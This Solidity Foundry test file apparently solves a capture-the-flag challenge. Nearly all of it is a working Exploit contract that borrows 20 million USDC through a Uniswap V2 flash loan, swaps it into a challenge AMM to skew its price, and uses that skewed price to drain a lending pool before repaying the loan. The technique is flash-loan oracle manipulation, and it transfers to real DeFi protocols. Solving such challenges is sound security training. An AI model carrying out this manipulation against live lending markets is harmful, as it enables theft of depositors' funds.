// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "./Challenge.sol";
import "./IUniswapV2Pair.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract ChallengeTest is Test {
    Setup setup;
    address public playerAddress;

    function setUp() public {
        vm.createSelectFork("mainnet", 17600000);

        playerAddress = makeAddr("player");
        ERC20 usdc = ERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
        ERC20 weth = ERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
        setup = new Setup(address(usdc), address(weth));
        deal(
            address(usdc),
            address(setup),
            20_900_000 * (10 ** usdc.decimals())
        );
        deal(address(weth), address(setup), 10_000 ether);
        setup.init();
    }

    function testExploit() public {
        vm.startPrank(playerAddress, playerAddress);

        ////////// YOUR CODE GOES HERE //////////
        new Exploit(setup).execute();
        ////////// YOUR CODE END //////////

        emit log_named_decimal_uint(
            "user tokenA",
            setup.tokenA().balanceOf(playerAddress),
            setup.tokenA().decimals()
        );
        emit log_named_decimal_uint(
            "user tokenB",
            setup.tokenB().balanceOf(playerAddress),
            setup.tokenB().decimals()
        );
        assertTrue(setup.isSolved(), "challenge not solved");
        vm.stopPrank();
    }
}

////////// YOUR CODE GOES HERE //////////
contract Exploit is IUniswapV2Callee {
    Setup setup;
    ERC20 usdc = ERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    ERC20 weth = ERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUniswapV2Pair pair =
        IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);

    uint256 loanAmount = 20000000 * (10 ** usdc.decimals()); //雑なパラメータ
    address receiver;

    constructor(Setup _setup) {
        setup = _setup;
    }

    function execute() external payable {
        receiver = msg.sender;
        pair.swap(loanAmount, 0, address(this), "flash"); //ループすればもっと行けそう
    }

    function uniswapV2Call(address, uint, uint, bytes calldata) external {
        setup.tokenA().approve(address(setup.amm()), type(uint256).max);
        setup.amm().swap(
            address(setup.tokenA()),
            address(setup.tokenB()),
            setup.tokenA().balanceOf(address(this))
        );

        uint256 lpA = setup.tokenA().balanceOf(address(setup.amm()));
        uint256 lpB = setup.tokenB().balanceOf(address(setup.amm()));
        uint256 withdrawAmount = setup.tokenA().balanceOf(
            address(setup.lendingPool())
        );
        uint256 depositAmount = (((withdrawAmount * lpB) / lpA) * 40000) /
            29999; // Power

        setup.tokenB().approve(address(setup.lendingPool()), type(uint256).max);
        setup.lendingPool().supply(address(setup.tokenB()), depositAmount);
        setup.lendingPool().withdraw(address(setup.tokenA()), withdrawAmount);

        setup.tokenB().approve(address(setup.amm()), type(uint256).max);
        setup.amm().swap(
            address(setup.tokenB()),
            address(setup.tokenA()),
            setup.tokenB().balanceOf(address(this))
        );

        setup.tokenA().transfer(address(pair), (loanAmount * 10031) / 10000);
        setup.tokenA().transfer(
            receiver,
            setup.tokenA().balanceOf(address(this))
        );
    }
}
////////// YOUR CODE END //////////
